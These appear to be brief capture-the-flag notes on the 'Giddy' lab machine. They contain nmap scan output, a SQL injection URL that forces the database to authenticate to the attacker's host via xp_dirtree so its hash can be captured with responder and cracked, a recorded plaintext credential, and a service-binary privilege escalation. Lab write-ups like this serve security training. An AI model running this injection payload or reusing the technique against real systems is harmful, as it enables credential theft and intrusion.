# NMAP TCP

TARGET: 10.129.96.140
ME: 10.10.15.62

```
└─$ sudo nmap -sC -sV --top-ports=200 -Pn 10.129.96.140
[sudo] password for xmen: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 19:54 -0500
Nmap scan report for 10.129.96.140
Host is up (0.031s latency).
Not shown: 197 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/https?
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2026-01-27T00:52:15
|_Not valid after:  2026-07-29T00:52:15
| rdp-ntlm-info: 
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2026-01-28T00:54:40+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# NMAP UDP

```

```

# Port 80

Found /mvc/Product.aspx?ProductSubCategoryId=18 which can be used for SQL injection

Used responder to grab hash of user running MSSQL via

http://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=18;%20EXEC%20master%20..xp_dirtree%20%27\\10.10.15.62\test%27;%20--

Used john with rockyou to crack this hash

Stacy
xNnWo6272k7x

# Port 3389

Used evil-winrm to connect using Stacy credentials

Found the vulnerable UnifiVideo service

Creating a custom Taskkill.exe in the right folder followed by stopping the service was enough for root





